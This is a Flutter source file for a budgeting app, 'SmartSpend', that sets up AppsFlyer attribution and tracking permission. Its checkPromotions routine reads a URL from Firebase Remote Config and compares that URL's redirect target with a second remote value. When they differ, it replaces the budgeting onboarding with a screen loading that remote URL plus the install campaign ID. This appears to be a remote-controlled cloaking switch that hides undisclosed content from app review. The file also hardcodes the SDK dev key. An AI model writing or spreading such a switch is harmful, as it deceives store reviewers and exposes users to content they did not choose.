import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:smartspend_app/router/router.dart';

import 'screens/onboarding/onboarding_screen.dart';
import 'theme/colors.dart';

class SmartSpendApp extends StatefulWidget {
  SmartSpendApp({super.key});

  @override
  State<SmartSpendApp> createState() => _SmartSpendAppState();
}

AppsFlyerOptions appsFlyerOptions = AppsFlyerOptions(
  afDevKey: "knxyqhoEmbXe4zrXV6ocB7",
  appId: "6478868357",
  showDebug: true,
  timeToWaitForATTUserAuthorization: 15,
  manualStart: true,
);
AppsflyerSdk appsflyerSdk = AppsflyerSdk(appsFlyerOptions);

class _SmartSpendAppState extends State<SmartSpendApp> {
  String promo = '';
  String campaignId = '';

  @override
  void initState() {
    super.initState();
    getTracking();
    initializeAppsFlyer();
  }

  Future<void> getTracking() async {
    final TrackingStatus status =
        await AppTrackingTransparency.requestTrackingAuthorization();
    print(status);
  }

  Future<void> initializeAppsFlyer() async {
    final appsFlyerOptions = AppsFlyerOptions(
      afDevKey: "knxyqhoEmbXe4zrXV6ocB7",
      appId: "6478868357",
      showDebug: true,
      timeToWaitForATTUserAuthorization: 15,
      manualStart: true,
    );

    final appsflyerSdk = AppsflyerSdk(appsFlyerOptions);

    appsflyerSdk.startSDK();
    await appsflyerSdk.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    appsflyerSdk.onInstallConversionData((data) {
      setState(() {
        campaignId = data['campaignId'] ?? '';
      });
    });

    appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
      switch (dp.status) {
        case Status.FOUND:
          print("Unified Deep Link: ${dp.deepLink?.toString()}");
          break;
        case Status.NOT_FOUND:
          print("Unified Deep Link not found");
          break;
        case Status.ERROR:
          print("Unified Deep Link error: ${dp.error}");
          break;
        case Status.PARSE_ERROR:
          print("Unified Deep Link parsing error");
          break;
      }
    });
  }

  Future<bool> checkPromotions() async {
    await initializeAppsFlyer();
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    final value = remoteConfig.getString('promotion');
    final exampleValue = remoteConfig.getString('promotionFeed');

    if (!value.contains('havenot')) {
      final client = HttpClient();
      final uri = Uri.parse(value);
      final request = await client.getUrl(uri);
      request.followRedirects = false;
      final response = await request.close();

      if (response.headers.value(HttpHeaders.locationHeader) != exampleValue) {
        SharedPreferences prefs = await SharedPreferences.getInstance();
        bool appsFlyerExecuted = prefs.getBool('appsFlyerExecuted') ?? false;

        if (!appsFlyerExecuted) {
          await initializeAppsFlyer();
          prefs.setBool('appsFlyerExecuted', true);
        }

        String dataFor = '';
        try {
          dataFor = remoteConfig
              .getString(campaignId.isNotEmpty ? campaignId : 'promotion');
          if (dataFor != value && dataFor.contains('http')) {
            promo = '$dataFor&campaignId=$campaignId';
            return true;
          }
        } catch (e) {
          promo = '$value&campaignId=$campaignId';
          return true;
        }
        promo = '$value&campaignId=$campaignId';
        return true;
      }
    }

    return false;
  }

  final _appRouter = AppRouter();

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: FutureBuilder<bool>(
        future: checkPromotions(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              child: const Center(
                child: CircularProgressIndicator(
                  color: Colors.blueAccent,
                ),
              ),
            );
          } else {
            if (snapshot.data == true && promo != '') {
              return PromotionScreen(data: promo);
            } else {
              return const OnboardingScreen();
            }
          }
        },
      ),
    );
  }
}
